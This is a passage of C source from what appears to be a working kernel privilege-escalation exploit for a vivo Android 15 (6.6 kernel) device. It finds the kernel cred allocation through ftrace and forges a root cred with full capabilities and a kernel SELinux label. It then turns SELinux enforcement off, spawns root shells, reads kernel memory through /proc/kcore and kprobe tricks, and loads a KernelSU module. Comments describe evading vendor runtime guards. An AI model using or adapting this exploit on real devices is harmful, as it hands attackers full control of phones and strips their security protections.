		pid_t w;
		int st = 0;

		errno = 0;
		/* No setresuid(): it rebuilds the credential through the fake
		 * sub-objects that rb_erase dirtied. uid/euid already read 0. */
		rep.setuid_ret = 0;
		rep.setuid_errno = 0;
		rep.reuid = (int)syscall(SYS_geteuid);
		rep.ruid = (int)syscall(SYS_getuid);
		rep.rsuid = rep.ruid;
		logf("[fake] fake_cred_page=%#llx\n",
		     (unsigned long long)g_fake_A);
		logf("[fake] caps before handoff:\n");
		{
			FILE *sf = fopen("/proc/self/status", "r");
			char sl[256];

			while (sf && fgets(sl, sizeof(sl), sf))
				if (!strncmp(sl, "Cap", 3) ||
				    !strncmp(sl, "Uid:", 4))
					logf("[fake]   %s", sl);
			if (sf)
				fclose(sf);
		}
		{
			int efd;
			ssize_t wr;

			/* The fake cred has euid=0, full caps and a kernel
			 * (sid 1) SELinux blob, so it can turn the global
			 * enforcing switch off through selinuxfs directly.
			 * This avoids the second/third UAF writes, which are
			 * unreliable on the vivo 6.6.127 build. */
			errno = 0;
			efd = open("/sys/fs/selinux/enforce",
				   O_WRONLY | O_CLOEXEC);
			if (efd >= 0) {
				wr = write(efd, "0", 1);
				logf("[fake] selinux enforce write=%zd errno=%d\n",
				     wr, errno);
				close(efd);
			} else {
				logf("[fake] open enforce failed errno=%d\n",
				     errno);
			}
			errno = 0;
			efd = open("/proc/sys/kernel/panic_on_warn",
				   O_WRONLY | O_CLOEXEC);
			if (efd >= 0) {
				wr = write(efd, "0", 1);
				logf("[fake] panic_on_warn write=%zd errno=%d\n",
				     wr, errno);
				close(efd);
			}
		}
		child_mark("pre-fork");
		(void)!write(4, &rep, sizeof(rep));
		close(4);
		logf("[fake] forking ksud worker (step 1)\n");
		w = fork();
		logf("[fake] fork returned %d (step 2)\n", (int)w);
		if (w == 0) {
			{
				int sret;

				errno = 0;
				sret = (int)syscall(SYS_setresuid, 0, 0, 0);
				logf("[fake] worker setresuid(0,0,0)=%d errno=%d\n",
				     sret, errno);
			}
			if (g_ksud_path[0]) {
				char *const av[] = {
					g_ksud_path,
					(char *)"late-load",
					(char *)"--kmi",
					g_kmi,
					(char *)"--allow-shell",
					NULL
				};

				logf("[fake] worker execing ksud directly (step 3)\n");
				execve(g_ksud_path, av, envp);
				logf("[fake] ksud exec failed errno=%d\n", errno);
			}
			{
				char *const av[] = {
					(char *)"/proc/self/exe",
					(char *)"gate",
					NULL
				};

				logf("[fake] worker execing gate mode\n");
				execve("/proc/self/exe", av, envp);
			}
			{
				char *const av[] = {
					(char *)"sh",
					(char *)"/data/local/tmp/ksu_stage.sh",
					NULL
				};

				logf("[fake] worker execing ksu_stage.sh (fallback)\n");
				execve("/system/bin/sh", av, envp);
			}
			logf("[fake] worker exec failed errno=%d\n", errno);
			_exit(127);
		}
		if (w > 0)
			waitpid(w, &st, 0);
		logf("[fake] worker exit=%#x\n", st);
		_exit(0);
	}
	if (rep.uid != 0) {
		rep.setuid_ret = -1;
		(void)write(4, &rep, sizeof(rep));
		close(4);
		logf("[-] child uid is not 0: the cred write did not land\n");
		_exit(3);
	}

	errno = 0;
	rep.setuid_ret = (int)syscall(SYS_setresuid, 0, 0, 0);
	rep.setuid_errno = errno;
	{
		uid_t ru = 1, eu = 1, su = 1;

		(void)getresuid(&ru, &eu, &su);
		rep.ruid = (int)ru;
		rep.reuid = (int)eu;
		rep.rsuid = (int)su;
	}
	(void)write(4, &rep, sizeof(rep));
	close(4);
	logf("[child] setresuid(0,0,0)=%d errno=%d resuid=%d/%d/%d\n",
	     rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
	if (rep.setuid_ret != 0) {
		logf("[-] setresuid failed; refusing to exec a shell\n");
		_exit(4);
	}

	switch (shell_mode) {
	case 2: {
		/* Hand this boot's root to the temporary-su daemon. */
		int rc = run_daemon_stage();

		logf("[-] daemon exec failed errno=%d\n", errno);
		_exit(rc ? 6 : 0);
	}
	case 1: {
		char *const av[] = { (char *)"sh", (char *)"-i", NULL };
		char *const envp[] = { (char *)"PATH=/system/bin:/system/xbin",
				       NULL };

		execve("/system/bin/sh", av, envp);
		break;
	}
	default: {
		char *const av[] = { (char *)"sh", (char *)"-c",
			(char *)"id; cat /proc/self/attr/current "
				"2>/dev/null; echo ROOT_SHELL_OK", NULL };
		char *const envp[] = { (char *)"PATH=/system/bin:/system/xbin",
				       NULL };

		execve("/system/bin/sh", av, envp);
		break;
	}
	}
	logf("[-] shell exec failed errno=%d\n", errno);
	_exit(5);
}

/* The child execs this binary so it owns a private real cred. That exec
 * allocates cred_jar (bytes_req 0xb8/bytes_alloc 0xc0); we leak its address
 * and keep the child blocked on fd 3 until the write has landed. */
static uint64_t g_child_task;
static int g_fake_stage;
static int g_fake_fix; /* own67: 1 = run the post-install uid repair plants */
static int g_skip_fake_uid; /* own126: skip the unconditional fake_uid plant */
static int g_child_nofix; /* own127: wait-child skips the second gate byte */
static int g_mp_idx, g_mp_total; /* /proc/modules position of hooks_defend */
static void every_n_ms(long *t0, int every, char *buf, size_t cap, int of)
{
	long now = (long)time(NULL);

	if (now - *t0 >= every / 50) {
		int n;

		*t0 = now;
		n = snprintf(buf, cap, "# beat %ld tid=%ld\n", now,
			     (long)syscall(SYS_gettid));
		if (n > 0) (void)!write(of, buf, (size_t)n);
		(void)fsync(of);
	}
}
static int g_diag_stage;
static int g_chain_stage;
static int g_uid0_stage;
static int g_fake2_stage;
static int g_fake5_stage;
static int g_fake6_stage;
static int g_fake7_stage;
static int g_fake9_stage;
static int g_fake10_stage;

static int read_status_line(int pid, const char *key, char *out, size_t cap)
{
	FILE *f;
	char path[64], line[256];

	snprintf(path, sizeof(path), "/proc/%d/status", pid);
	f = fopen(path, "r");
	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		if (!strncmp(line, key, strlen(key))) {
			snprintf(out, cap, "%s", line);
			fclose(f);
			return 0;
		}
	}
	fclose(f);
	return -1;
}

static uint64_t leak_cred(pid_t *out_pid, int *out_go, int *out_st,
			  int shell_mode)
{
	for (int attempt = 0; attempt < 4; attempt++) {
		int go[2], st[2];
		pid_t p;
		long n;
		int c, hello = 0;
		uint64_t R = 0, site = 0;

		if (pipe(go) || pipe(st))
			return 0;
		/* Start tracing before the fork so the child's task_struct
		 * allocation (copy_process) is captured, not just its creds.
		 * Pin the parent as well: scan_task_allocs() only reads
		 * g_cpu's raw buffer, so the parent's copy_process record must
		 * be on the same CPU as the child's cred record. */
		pin(g_cpu);
		trace_start();
		p = fork();
		if (p == 0) {
			int g2, s2;
			char ch;

			close(go[1]);
			close(st[0]);
			g2 = fcntl(go[0], F_DUPFD, 20);
			s2 = fcntl(st[1], F_DUPFD, 20);
			if (g2 < 0 || s2 < 0)
				_exit(125);
			close(go[0]);
			close(st[1]);
			dup2(g2, 3);
			dup2(s2, 4);
			close(g2);
			close(s2);
			pin(g_cpu);
			if (read(3, &ch, 1) != 1)
				_exit(126);
			{
				char *const av[] = {
					(char *)"/proc/self/exe",
					(char *)"wait",
					(char *)(shell_mode == 7	? "f6"
						 : shell_mode == 6	? "uid0"
						 : shell_mode == 5	? "chain"
						 : shell_mode == 3	? "caps"
						 : shell_mode == 2 ? "daemon"
						 : shell_mode == 1 ? "shell"
						 : g_fake_stage	   ? "fake"
								   : "verify"),
					(char *)(g_skip_fake_uid ? "nofix" : "normal"),
					NULL
				};
				char *const ep[] = {
					(char *)"PATH=/system/bin:/system/xbin", NULL
				};

				execve("/proc/self/exe", av, ep);
			}
			_exit(127);
		}
		if (p < 0) {
			close(go[0]);
			close(go[1]);
			close(st[0]);
			close(st[1]);
			return 0;
		}
		close(go[0]);
		close(st[1]);
		if (write(go[1], "A", 1) != 1)
			logf("[!] cred wake write failed\n");
		usleep(80000);
		trace_stop();
		n = read_cpu(g_cpu, g_raw, g_raw_cap);
		c = n > 0 ? parse_events(g_raw, (size_t)n, g_evs, 400000) : 0;
		{
			int nmatch = 0;

			for (int i = 0; i < c; i++) {
				if (g_evs[i].type != EV_CACHE_ALLOC ||
				    g_evs[i].pid != (int)p)
					continue;
				if (g_evs[i].req != CRED_REQ ||
				    g_evs[i].alloc != CRED_ALLOC ||
				    (g_evs[i].site & 0x1fffff) != CRED_SITE_LOW21)
					continue;
				nmatch++;
				logf("[cred]   match#%d ptr=%#llx site_low=%#llx\n",
				     nmatch, (unsigned long long)g_evs[i].ptr,
				     (unsigned long long)(g_evs[i].site & 0x1fffff));
				/* The effective cred is the one commit_creds()
				 * installs, i.e. the last cred_jar allocation
				 * made by prepare_exec_creds() before exec
				 * completes. Keep taking matches so the last
				 * one wins. */
				R = g_evs[i].ptr;
				site = g_evs[i].site;
			}
			logf("[cred] attempt=%d child=%d matches=%d\n", attempt, p,
			     nmatch);
		}
		if (R) {
			struct pollfd pf = { .fd = st[0], .events = POLLIN };

			if (poll(&pf, 1, 2000) > 0 &&
			    read(st[0], &hello, sizeof(hello)) ==
				    sizeof(hello) &&
			    hello == CHILD_HELLO) {
				/* copy_process runs in our context, so the record
				 * carries our pid but the pointer is the child's
				 * task_struct. */
				g_child_task = scan_task_allocs(g_evs, c, getpid());
				logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx recs=%d task=%#llx\n",
				     attempt, p, (unsigned long long)R,
				     (unsigned long long)(site & 0x1fffff), c,
				     (unsigned long long)g_child_task);
				*out_pid = p;
				*out_go = go[1];
				*out_st = st[0];
				return R;
			}
		}
		logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d failed\n",
		     attempt, p, (unsigned long long)R, hello, c);
		close(go[1]);
		close(st[0]);
		kill(p, SIGKILL);
		waitpid(p, NULL, 0);
	}
	return 0;
}

static int uid0_child_main(void)
{
	struct child_report rep;
	char ch;
	int hello = CHILD_HELLO;

	pin(g_cpu);
	child_mark("uid0-start");
	if (write(4, &hello, sizeof(hello)) != sizeof(hello))
		_exit(130);
	for (;;) {
		struct __user_cap_header_struct hdr;
		struct __user_cap_data_struct data[2];
		unsigned long long caps = 0;

		if (read(3, &ch, 1) != 1)
			_exit(131);
		if (ch == 'X')
			_exit(0);
		if (ch != 'A' && ch != 'G')
			_exit(132);
		memset(&rep, 0, sizeof(rep));
		rep.magic = CHILD_MAGIC;
		rep.uid = (int)syscall(SYS_getuid);
		rep.euid = (int)syscall(SYS_geteuid);
		memset(&hdr, 0, sizeof(hdr));
		hdr.version = _LINUX_CAPABILITY_VERSION_3;
		memset(data, 0, sizeof(data));
		if (syscall(SYS_capget, &hdr, data) == 0)
			caps = (unsigned long long)data[0].effective |
			       ((unsigned long long)data[1].effective << 32);
		rep.caps = caps;
		(void)!write(4, &rep, sizeof(rep));
		if (ch == 'G')
			break;
	}
	child_mark("uid0-go");
	{
		/* No setresuid(): finit_module only checks cap_effective, and
		 * keeping the ids untouched keeps the worker alive. */
		(void)signal(SIGPIPE, SIG_IGN);
		(void)signal(SIGCHLD, SIG_IGN);
		(void)signal(SIGTERM, SIG_IGN);
		{
			long q;
			int qe;

			errno = 0;
			q = syscall(SYS_finit_module, -1, NULL, 0);
			qe = errno;
			memset(&rep, 0, sizeof(rep));
			rep.magic = CHILD_MAGIC;
			rep.ruid = 99;
			rep.setuid_ret = (int)q;
			rep.setuid_errno = qe;
			rep.uid = (int)syscall(SYS_getuid);
			rep.euid = (int)syscall(SYS_geteuid);
			(void)!write(4, &rep, sizeof(rep));
		}
		{
			struct stat stb;
			void *mb = NULL;
			int fd;
			long ir = -1;
			int ie = 0;
			unsigned long mlen = 0;

			memset(&stb, 0, sizeof(stb));
			fd = open("/data/local/tmp/android15-6.6_kernelsu.ko",
				  O_RDONLY | O_CLOEXEC);
			if (fd < 0) {
				ie = errno;
			} else {
				if (fstat(fd, &stb) == 0 && stb.st_size > 0 &&
				    stb.st_size < (1 << 24)) {
					mlen = (unsigned long)stb.st_size;
					mb = malloc(mlen);
					if (mb) {
						ssize_t got = read(fd, mb, mlen);

						if (got == (ssize_t)mlen) {
							errno = 0;
							ir = syscall(SYS_init_module,
								     mb, mlen,
								     "allow_shell=1");
							ie = errno;
						} else {
							ir = -2;
							ie = errno;
						}
					} else {
						ir = -3;
						ie = ENOMEM;
					}
				} else {
					ir = -4;
					ie = errno;
				}
				close(fd);
			}
			memset(&rep, 0, sizeof(rep));
			rep.magic = CHILD_MAGIC;
			rep.ruid = 98;
			rep.setuid_ret = (int)ir;
			rep.setuid_errno = ie;
			rep.uid = (int)syscall(SYS_getuid);
			rep.euid = (int)syscall(SYS_geteuid);
			rep.rsuid = (int)mlen;
			(void)!write(4, &rep, sizeof(rep));
			free(mb);
		}
		for (int k = 0; k < 3; k++) {
			struct __user_cap_header_struct hdr;
			struct __user_cap_data_struct data[2];
			unsigned long long caps = 0;
			int fl = (k == 0) ? 0 : (k == 1 ? 2 : 3);
			long r;
			int e, fd;

			memset(&rep, 0, sizeof(rep));
			rep.magic = CHILD_MAGIC;
			rep.ruid = fl;
			fd = open("/data/local/tmp/android15-6.6_kernelsu.ko",
				  O_RDONLY | O_CLOEXEC);
			if (fd < 0) {
				r = -1;
				e = errno;
			} else {
				errno = 0;
				r = syscall(SYS_finit_module, fd,
					    "allow_shell=1", fl);
				e = errno;
				close(fd);
			}
			rep.setuid_ret = (int)r;
			rep.setuid_errno = e;
			rep.uid = (int)syscall(SYS_getuid);
			rep.euid = (int)syscall(SYS_geteuid);
			memset(&hdr, 0, sizeof(hdr));
			hdr.version = _LINUX_CAPABILITY_VERSION_3;
			memset(data, 0, sizeof(data));
			if (syscall(SYS_capget, &hdr, data) == 0)
				caps = (unsigned long long)data[0].effective |
				       ((unsigned long long)data[1].effective
					<< 32);
			rep.caps = caps;
			(void)!write(4, &rep, sizeof(rep));
			if (r == 0)
				break;
		}
	}
	/* Stay alive as the root worker. */
	for (;;)
		pause();
}

static int f6_child_main(void)
{
	struct child_report rep;
	char ch;
	int hello = CHILD_HELLO;

	pin(g_cpu);
	child_mark("f6-start");
	if (write(4, &hello, sizeof(hello)) != sizeof(hello))
		_exit(130);
	for (;;) {
		struct __user_cap_header_struct hdr;
		struct __user_cap_data_struct data[2];
		unsigned long long caps = 0;

		if (read(3, &ch, 1) != 1)
			_exit(131);
		if (ch == 'X')
			_exit(0);
		if (ch == 'W') {
			/* autonomous final step: the parent will trigger the
			 * security write and may die at the reap. */
			sleep(30);
			{
				int fd = open("/data/local/tmp/android15-6.6_kernelsu.ko",
					      O_RDONLY | O_CLOEXEC);
				long r;
				int e;

				errno = 0;
				if (fd < 0) {
					r = -1;
					e = errno;
				} else {
					r = syscall(SYS_finit_module, fd,
						    "allow_shell=1", 0);
					e = errno;
					close(fd);
				}
				{
					int ofd = open("/data/local/tmp/f6_result.txt",
						       O_WRONLY | O_CREAT |
							       O_TRUNC |
							       O_CLOEXEC,
						       0666);
					char rb[256];
					int rn = snprintf(rb, sizeof(rb),
							  "finit rc=%ld errno=%d uid=%d euid=%d\n",
							  r, e,
							  (int)syscall(SYS_getuid),
							  (int)syscall(SYS_geteuid));

					if (ofd >= 0) {
						(void)!write(ofd, rb, (size_t)rn);
						close(ofd);
					}
				}
			}
			for (;;)
				pause();
		}
		if (ch == 'G') {
			{
				int pfd = open("/data/local/tmp/f6_probe.txt",
					       O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
				if (pfd >= 0) {
					char pb[160];
					long d1, d2;
					int e1, e2, pn;

					errno = 0; d1 = syscall(SYS_finit_module, -1, "", 0); e1 = errno;
					errno = 0; d2 = syscall(SYS_delete_module, "zz_nope", 0); e2 = errno;
					pn = snprintf(pb, sizeof(pb),
						      "finit(-1)=%ld errno=%d del=%ld errno=%d uid=%d\n",
						      d1, e1, d2, e2, (int)syscall(SYS_getuid));
					(void)!write(pfd, pb, (size_t)pn);
					close(pfd);
				}
			}
			int fd = open("/data/local/tmp/android15-6.6_kernelsu.ko",
				      O_RDONLY | O_CLOEXEC);
			long r;
			int e;

			errno = 0;
			if (fd < 0) {
				r = -1;
				e = errno;
			} else {
				r = syscall(SYS_finit_module, fd,
					    "allow_shell=1", 0);
				e = errno;
				close(fd);
			}
			memset(&rep, 0, sizeof(rep));
			rep.magic = CHILD_MAGIC;
			rep.ruid = 88;
			rep.setuid_ret = (int)r;
			rep.setuid_errno = e;
			rep.uid = (int)syscall(SYS_getuid);
			rep.euid = (int)syscall(SYS_geteuid);
			(void)!write(4, &rep, sizeof(rep));
			for (;;)
				pause();
		}
		if (ch != 'A')
			_exit(132);
		memset(&rep, 0, sizeof(rep));
		rep.magic = CHILD_MAGIC;
		rep.uid = (int)syscall(SYS_getuid);
		rep.euid = (int)syscall(SYS_geteuid);
		memset(&hdr, 0, sizeof(hdr));
		hdr.version = _LINUX_CAPABILITY_VERSION_3;
		memset(data, 0, sizeof(data));
		if (syscall(SYS_capget, &hdr, data) == 0)
			caps = (unsigned long long)data[0].effective |
			       ((unsigned long long)data[1].effective << 32);
		rep.caps = caps;
		(void)!write(4, &rep, sizeof(rep));
	}
}

static void fatal_sig_handler(int sig)
{
	/* Keep the held zombies and the fake-cred page alive; dying would let
	 * init adopt-and-reap them and erase into freed memory. */
	logf("[!] fatal signal %d; parking to keep held state (reboot to clean)\n",
	     sig);
	for (;;)
		pause();
}

/* Chain child: the parent may wake us several times to verify the fake-cred
 * swap and to repair the uid field, then finally sends 'G' to run the
 * KernelSU half of the chain.  getuid/geteuid/capget are not LSM-hooked, so
 * they are safe even while we carry the forged cred. */
static int chain_child_main(void)
{
	struct child_report rep;
	char ch;
	int hello = CHILD_HELLO;

	pin(g_cpu);
	child_mark("chain-start");
	if (write(4, &hello, sizeof(hello)) != sizeof(hello))
		_exit(130);
	for (;;) {
		struct __user_cap_header_struct hdr;
		struct __user_cap_data_struct data[2];
		unsigned long long caps = 0;

		if (read(3, &ch, 1) != 1)
			_exit(131);
		if (ch == 'X')
			_exit(0);
		if (ch != 'A' && ch != 'G')
			_exit(132);
		memset(&rep, 0, sizeof(rep));
		rep.magic = CHILD_MAGIC;
		rep.uid = (int)syscall(SYS_getuid);
		rep.euid = (int)syscall(SYS_geteuid);
		memset(&hdr, 0, sizeof(hdr));
		hdr.version = _LINUX_CAPABILITY_VERSION_3;
		memset(data, 0, sizeof(data));
		if (syscall(SYS_capget, &hdr, data) == 0)
			caps = (unsigned long long)data[0].effective |
			       ((unsigned long long)data[1].effective << 32);
		rep.caps = caps;
		(void)!write(4, &rep, sizeof(rep));
		if (ch == 'G')
			break;
	}
	child_mark("chain-go");
	/* Do NOT touch selinux_state here: the fake cred already carries
	 * sid=1 (kernel), and vivo's runtime guard kills/undoes any attempt
	 * to switch SELinux to permissive. */
	{
		char *const envp[] = {
			(char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
			(char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
			(char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
			NULL
		};
		pid_t w;
		int st = 0;

		rep.setuid_ret = 0;
		rep.setuid_errno = 0;
		(void)!write(4, &rep, sizeof(rep));
		close(4);
		w = fork();
		if (w == 0) {
			char *const av[] = {
				(char *)"sh",
				(char *)"/data/local/tmp/ksu_stage.sh",
				NULL
			};

			execve("/system/bin/sh", av, envp);
			_exit(127);
		}
		if (w > 0)
			waitpid(w, &st, 0);
		logf("[chain] worker exit=%#x\n", st);
		_exit(0);
	}
}

/* ---- CLONE_VM fake-cred helper -------------------------------------- */
static _Atomic int g_h_seq, g_h_load;
static volatile int g_h_uid = -1, g_h_euid = -1, g_h_seen;
static volatile unsigned long long g_h_caps;
static volatile long g_h_rc = -999;
static volatile int g_h_errno;
static void *g_h_stack;

static int fake5_helper(void *x)
{
	int seen = 0;

	(void)x;
	pin(g_cpu);
	for (;;) {
		int cur;

		while ((cur = atomic_load(&g_h_seq)) == seen)
			sched_yield();
		seen = cur;
		{
			struct __user_cap_header_struct hdr;
			struct __user_cap_data_struct data[2];
			unsigned long long caps = 0;

			g_h_uid = (int)syscall(SYS_getuid);
			g_h_euid = (int)syscall(SYS_geteuid);
			memset(&hdr, 0, sizeof(hdr));
			hdr.version = _LINUX_CAPABILITY_VERSION_3;
			memset(data, 0, sizeof(data));
			if (syscall(SYS_capget, &hdr, data) == 0)
				caps = (unsigned long long)data[0].effective |
				       ((unsigned long long)data[1].effective
					<< 32);
			g_h_caps = caps;
			g_h_seen = cur;
		}
		if (atomic_load(&g_h_load)) {
			int fd = open("/data/local/tmp/android15-6.6_kernelsu.ko",
				      O_RDONLY | O_CLOEXEC);
			long r;
			int e;

			errno = 0;
			if (fd < 0) {
				r = -1;
				e = errno;
			} else {
				r = syscall(SYS_finit_module, fd,
					    "allow_shell=1", 0);
				e = errno;
				close(fd);
			}
			g_h_rc = r;
			g_h_errno = e;
			break;
		}
	}
	for (;;)
		pause();
	return 0;
}

static uint16_t rd16(const unsigned char *p, size_t o)
{
	uint16_t v;

	memcpy(&v, p + o, 2);
	return v;
}

static uint32_t rd32(const unsigned char *p, size_t o)
{
	uint32_t v;

	memcpy(&v, p + o, 4);
	return v;
}

static uint64_t rd64(const unsigned char *p, size_t o)
{
	uint64_t v;

	memcpy(&v, p + o, 8);
	return v;
}

static void wr16(unsigned char *p, size_t o, uint16_t v)
{
	memcpy(p + o, &v, 2);
}

static void wr64(unsigned char *p, size_t o, uint64_t v)
{
	memcpy(p + o, &v, 8);
}

/* own86: ksuinit's job, done offline: bind every undefined symbol of the
 * LKM to its vmlinux address + KASLR slide and mark it SHN_ABS, so the
 * kernel's loader needs no /proc/kallsyms. */
static int bind_ko_symbols(unsigned char *img, size_t len, uint64_t slide)
{
	uint64_t shoff, symoff = 0, symsize = 0, stroff = 0, strsize = 0;
	uint64_t entsize = 0;
	uint16_t shentsize, shnum;
	int have_sym = 0, bound = 0, miss = 0;
	size_t i;

	if (len < 64 || img[0] != 0x7f || img[1] != 'E' || img[2] != 'L' ||
	    img[3] != 'F' || img[4] != 2)
		return -1;
	shoff = rd64(img, 0x28);
	shentsize = rd16(img, 0x3a);
	shnum = rd16(img, 0x3c);
	if (shentsize < 64)
		return -1;
	for (i = 0; i < shnum; i++) {
		size_t so = (size_t)shoff + i * shentsize;
		uint32_t type, link;

		if (so + 64 > len)
			break;
		type = rd32(img, so + 4);
		if (type != 2)		/* SHT_SYMTAB */
			continue;
		symoff = rd64(img, so + 0x18);
		symsize = rd64(img, so + 0x20);
		entsize = rd64(img, so + 0x38);
		link = rd32(img, so + 0x28);
		{
			size_t lo = (size_t)shoff + (size_t)link * shentsize;

			if (link >= shnum || lo + 64 > len)
				return -1;
			stroff = rd64(img, lo + 0x18);
			strsize = rd64(img, lo + 0x20);
		}
		have_sym = 1;
		break;
	}
	if (!have_sym || entsize < 24 || symoff + symsize > len ||
	    stroff + strsize > len)
		return -1;
	for (i = 0; i + entsize <= symsize; i += entsize) {
		size_t e = (size_t)symoff + i;
		uint32_t nameoff = rd32(img, e);
		uint16_t shndx = rd16(img, e + 6);
		size_t nl = 0, k;

		if (shndx != 0 || nameoff >= strsize)
			continue;
		while (nameoff + nl < strsize && img[stroff + nameoff + nl])
			nl++;
		for (k = 0; k < N_KSYMS; k++) {
			const char *cn = g_ksyms[k].n;

			if (strlen(cn) == nl &&
			    !strncmp(cn, (const char *)img + stroff + nameoff, nl)) {
				wr64(img, e + 8, g_ksyms[k].a + slide);
				wr16(img, e + 6, 0xfff1);	/* SHN_ABS */
				bound++;
				break;
			}
		}
		if (k == N_KSYMS)
			miss++;
	}
	logf("[insmod] bound=%d missing=%d slide=%#llx\n", bound, miss,
	     (unsigned long long)slide);
	return 0;
}

static uint64_t read_slide_file(void)
{
	FILE *f = fopen("/data/local/tmp/ksu_slide.txt", "r");
	unsigned long long s = 0;

	if (!f)
		return 0;
	if (fscanf(f, "%llx", &s) != 1)
		s = 0;
	fclose(f);
	return s;
}

/* own90 gate-mode addon: read/write the four vivo gates, then load the LKM.
 * kread uses a kprobe_events fetcharg probe on capable() -- the same trick
 * the M3 kit uses; capable() is guaranteed to be called by may_init_module()
 * before anything else in the init_module syscall. */
#define CAPABLE_STATIC		0xffffffc0800c09c8ULL
#define KPROBE_TABLE_STATIC	0xffffffc08237ec80ULL
#define LOAD_MODULE_STATIC	0xffffffc08017d51cULL
#define TRACE_MODULE_NOTIFY_STATIC 0xffffffc0801f9ec4ULL
#define GOLDEN_RATIO_64		0x61c8864680b583ebULL
static int insmod_main(void);

static int wrf(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;

	if (fd < 0)
		return -1;
	n = write(fd, val, strlen(val));
	close(fd);
	return n == (ssize_t)strlen(val) ? 0 : -1;
}

static uint64_t rd_hex_file(const char *path)
{
	FILE *f = fopen(path, "r");
	unsigned long long v = 0;

	if (!f)
		return 0;
	if (fscanf(f, "%llx", &v) != 1)
		v = 0;
	fclose(f);
	return v;
}

/* own93: /proc/kcore gives us an arbitrary kernel read without kprobes.
 * Parse the ELF core program headers once, then lseek+read by vaddr. */
struct kcore_seg {
	uint64_t vaddr, off, memsz;
};
static int g_kcore_fd = -1;
static struct kcore_seg g_kcore[64];
static int g_kcore_n;

static int kcore_open(void)
{
	unsigned char eh[64], ph[64];
	uint64_t phoff;
	uint16_t phentsize, phnum;
	int i;

	if (g_kcore_fd >= 0)
		return 0;
	g_kcore_fd = open("/proc/kcore", O_RDONLY | O_CLOEXEC);
	if (g_kcore_fd < 0) {
		logf("[kcore] open errno=%d\n", errno);
		return -1;
	}
	if (read(g_kcore_fd, eh, sizeof(eh)) != (ssize_t)sizeof(eh) ||
	    eh[0] != 0x7f || eh[1] != 'E' || eh[2] != 'L' || eh[3] != 'F' ||
	    eh[4] != 2) {
		logf("[kcore] bad elf header\n");
		close(g_kcore_fd);
		g_kcore_fd = -1;
		return -1;
	}
	memcpy(&phoff, eh + 0x20, 8);
	memcpy(&phentsize, eh + 0x36, 2);
	memcpy(&phnum, eh + 0x38, 2);
	logf("[kcore] phoff=%#llx ent=%u num=%u\n", (unsigned long long)phoff,
	     phentsize, phnum);
	if (phentsize < 56 || phnum > 64) {
		close(g_kcore_fd);
		g_kcore_fd = -1;
		return -1;
	}
	for (i = 0; i < phnum; i++) {
		uint32_t p_type;
		uint64_t p_offset, p_vaddr, p_memsz;

		if (pread(g_kcore_fd, ph, phentsize,
			  (off_t)(phoff + (uint64_t)i * phentsize)) < 56)
			break;
		memcpy(&p_type, ph + 0x00, 4);
		memcpy(&p_offset, ph + 0x08, 8);
		memcpy(&p_vaddr, ph + 0x10, 8);
		memcpy(&p_memsz, ph + 0x28, 8);
		if (p_type != 1 || !p_memsz)
			continue;
		g_kcore[g_kcore_n].vaddr = p_vaddr;
		g_kcore[g_kcore_n].off = p_offset;
		g_kcore[g_kcore_n].memsz = p_memsz;
		g_kcore_n++;
	}
	logf("[kcore] segments=%d\n", g_kcore_n);
	return g_kcore_n ? 0 : -1;
}

static int kcore_read(uint64_t addr, void *buf, size_t n)
{
	int i;

	if (kcore_open())
		return -1;
	for (i = 0; i < g_kcore_n; i++) {
		struct kcore_seg *s = &g_kcore[i];

		if (addr >= s->vaddr && addr + n <= s->vaddr + s->memsz) {
			off_t off = (off_t)(s->off + (addr - s->vaddr));

			if (pread(g_kcore_fd, buf, n, off) != (ssize_t)n)
				return -1;
			return 0;
		}
	}
	return -1;
}

/* prefer /proc/kcore; fall back to the kprobe fetcharg trick */
static int kread_kcore(uint64_t *addrs, int n, uint64_t *out)
{
	int i;

	if (g_kcore_n == 0 && kcore_open())
		return -1;
	for (i = 0; i < n; i++) {
		uint64_t v = 0;

		if (kcore_read(addrs[i], &v, 8))
			return -1;
		out[i] = v;
	}
	return 0;
}

/* one kread round: fetch up to 8 u64s from kernel memory via a kprobe
 * fetcharg on capable(), which our init_module(NULL,0,NULL) call triggers. */
static int kread(uint64_t *addrs, int n, uint64_t *out)
{
	static int seq;
	char ev[32], cmd[1024];
	char *buf = NULL;
	int attempt;

	if (n <= 0 || n > 8)
		return -1;
	/* own129: use a private trace instance so the exploit's global kmem
	 * event flood cannot evict our kprobe records (this was the cause of
	 * the 21/50 and 0/50 selftest failures). */
	if (mkdir("/sys/kernel/tracing/instances/kr", 0755) && errno != EEXIST)
		logf("[kread] instance mkdir errno=%d\n", errno);
	if (!kread_kcore(addrs, n, out))
		return 0;
	seq++;
	snprintf(ev, sizeof(ev), "kr%d", seq);
	(void)wrf("/sys/kernel/tracing/instances/kr/tracing_on", "0");
	if (wrf("/sys/kernel/tracing/instances/kr/buffer_size_kb", "64"))
		logf("[kread] buffer_size errno=%d\n", errno);
	{
		int off = snprintf(cmd, sizeof(cmd), "p:%s capable", ev);
		int i;

		for (i = 0; i < n; i++)
			off += snprintf(cmd + off, sizeof(cmd) - (size_t)off,
					" a%d=@0x%llx", i,
					(unsigned long long)addrs[i]);
		if (wrf("/sys/kernel/tracing/kprobe_events", cmd)) {
			logf("[kread] register %s errno=%d\n", ev, errno);
			return -1;
		}
	}
	if (wrf("/sys/kernel/tracing/instances/kr/events/kprobes/enable", "1"))
		logf("[kread] enable errno=%d\n", errno);
	for (attempt = 0; attempt < 6; attempt++) {
		ssize_t got = 0, r;
		size_t cap = 1 << 20;
		int fd, found = -1;

		/* own128: after a few dozen rounds the 64 KiB ring starts
		 * dropping our record under the system event load; flush and
		 * re-init it before every attempt. */
		(void)wrf("/sys/kernel/tracing/instances/kr/buffer_size_kb", "8192");
		usleep(20000);
		(void)wrf("/sys/kernel/tracing/instances/kr/buffer_size_kb", "64");
		usleep(10000);
		(void)wrf("/sys/kernel/tracing/instances/kr/trace", "\n");
		(void)wrf("/sys/kernel/tracing/instances/kr/tracing_on", "1");
		errno = 0;
		for (int tt = 0; tt < 5; tt++)
